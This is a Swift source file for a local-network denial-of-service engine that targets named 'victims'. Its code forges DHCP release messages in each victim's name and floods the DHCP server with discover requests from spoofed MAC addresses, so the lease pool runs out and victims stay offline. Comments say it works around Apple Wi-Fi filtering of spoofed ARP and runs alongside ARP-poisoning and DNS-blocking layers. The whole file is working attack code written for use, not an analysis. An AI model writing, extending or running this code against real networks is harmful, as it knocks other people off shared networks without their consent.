import Foundation

/// L3 cut layer — DHCP attack engine.
///
/// Apple's M1+ Wi-Fi driver silently filters spoofed L2 ARP frames. DHCP is
/// at L3 (broadcast UDP) and the same filter does NOT apply — pcap_inject of
/// DHCP frames actually leaves the radio. This module fires:
///
///   1. **DHCPRELEASE per victim** at 1 Hz — forges a release from the
///      victim's MAC + IP claiming "I'm done with this lease." The DHCP
///      server (almost always the gateway) marks the lease released. Some
///      gateways immediately drop NAT/firewall state for that IP, severing
///      active connections.
///
///   2. **DHCPDISCOVER starvation** at 5 Hz with random spoofed MACs —
///      exhausts the DHCP server's lease pool so the victim can't get a new
///      lease after our RELEASE forces a renew. Sustained pressure keeps
///      them disconnected.
///
/// Designed to run alongside the existing ARP poison + DNS NXDOMAIN layers.
/// On networks where ARP works, ARP is the primary kill. On networks where
/// the Wi-Fi driver eats our ARP, DHCP is what actually disconnects victims.
actor DHCPAttacker {

    struct Victim: Hashable {
        let mac: MACAddress
        let ipv4: String
    }

    private var handle: OpaquePointer?
    private var victims: [Victim] = []
    private var serverID: String = ""        // gateway IP / DHCP server IP
    private var ourMAC: MACAddress?
    private var task: Task<Void, Never>?
    private var releaseCount: UInt64 = 0
    private var starveCount: UInt64 = 0
    private var lastReportAt: Date = .distantPast

    func start(context: NetworkContext, victims: [Victim]) {
        self.victims = victims
        self.serverID = context.gatewayIPv4
        self.ourMAC = context.selfMAC

        if handle == nil {
            var errbuf = [CChar](repeating: 0, count: 256)
            let h = context.interface.withCString { ic in
                wm_dhcp_open(ic, &errbuf).map(OpaquePointer.init)
            }
            guard let h else {
                Log.root.error("DHCPAttacker: wm_dhcp_open failed: \(String(cString: errbuf), privacy: .public)")
                return
            }
            self.handle = h
            Log.root.info("DHCPAttacker: opened on \(context.interface, privacy: .public) server=\(context.gatewayIPv4, privacy: .public)")
        }

        if task == nil {
            task = Task.detached(priority: .userInitiated) { [weak self] in
                await self?.loop()
            }
        }
    }

    func update(victims: [Victim], context: NetworkContext) {
        self.victims = victims
        self.serverID = context.gatewayIPv4
        self.ourMAC = context.selfMAC
    }

    func stop() {
        task?.cancel()
        task = nil
        if let h = handle {
            wm_dhcp_close(UnsafeMutableRawPointer(h))
            handle = nil
        }
        victims.removeAll()
    }

    private func loop() async {
        var tickIdx: UInt64 = 0
        while !Task.isCancelled {
            tickIdx &+= 1
            await tick(idx: tickIdx)
            try? await Task.sleep(nanoseconds: 200_000_000)  // 5 Hz outer
        }
    }

    private func tick(idx: UInt64) async {
        guard let h = handle, let ourMAC else { return }

        // Every tick (5 Hz): one DHCPDISCOVER from a random fake MAC. Pool
        // starvation keeps the victim from regaining a lease after our
        // releases.
        let ourBytes = ourMAC.bytes
        ourBytes.withUnsafeBufferPointer { mp in
            let r = wm_dhcp_send_starve(UnsafeMutableRawPointer(h), mp.baseAddress)
            if r == 0 { starveCount += 1 }
        }

        // Every 5 ticks (≈1 Hz): one DHCPRELEASE per victim. Forges the
        // release as if it came from each victim, telling the server to
        // drop their lease. Sustained at 1 Hz so any victim that re-leases
        // gets kicked again on the next cycle.
        if idx % 5 == 0 {
            let serverID = self.serverID
            for v in victims {
                let vMacBytes = v.mac.bytes
                let r = ourBytes.withUnsafeBufferPointer { ourPtr in
                    vMacBytes.withUnsafeBufferPointer { vmPtr in
                        v.ipv4.withCString { vip in
                            serverID.withCString { sid in
                                wm_dhcp_send_release(UnsafeMutableRawPointer(h),
                                                     ourPtr.baseAddress,
                                                     vmPtr.baseAddress,
                                                     vip, sid)
                            }
                        }
                    }
                }
                if r == 0 { releaseCount += 1 }
            }
        }

        let now = Date.now
        if now.timeIntervalSince(lastReportAt) > 5 {
            Log.root.info("DHCPAttacker: releases=\(self.releaseCount, privacy: .public) starves=\(self.starveCount, privacy: .public) victims=\(self.victims.count, privacy: .public)")
            lastReportAt = now
        }
    }
}
